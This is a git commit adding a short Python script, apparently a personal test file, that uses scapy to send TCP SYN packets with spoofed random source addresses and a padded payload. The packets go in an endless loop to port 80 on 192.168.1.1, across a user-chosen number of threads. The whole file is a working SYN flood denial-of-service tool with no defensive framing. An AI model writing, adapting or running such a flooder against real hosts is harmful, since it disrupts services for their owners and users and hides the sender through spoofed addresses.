ef9da23f00fad75895fd77304f42da15225e58fa
introvps <129018860+introvps@users.noreply.github.com>
2023-03-31 19:53:24 -0300

    Create teste.py

---
+++ teste.py
@@ -0,0 +1,25 @@
+from scapy.all import *
+import threading
+def flood():
+        # Define o endereço IP de origem e destino
+        src_ip = RandIP()
+        dst_ip = '192.168.1.1'
+
+        # Define o número de porta de origem e destino
+        src_port = 1234
+        dst_port = 80
+
+        dado = b"ola tudo bem" * 50
+        # Cria um pacote TCP SYN
+        tcp_packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, seq=1505066, flags="S")/Raw(load=dado)
+
+        # Envia o pacote
+        limit = 0
+        #while limit < 1050:
+            #print(len(tcp_packet[TCP].payload))
+        send(tcp_packet, loop=1, verbose=1)
+
+n = int(input('Numero de thread: '))
+for i in range(n):
+        x = threading.Thread(target=flood)
+        x.start()
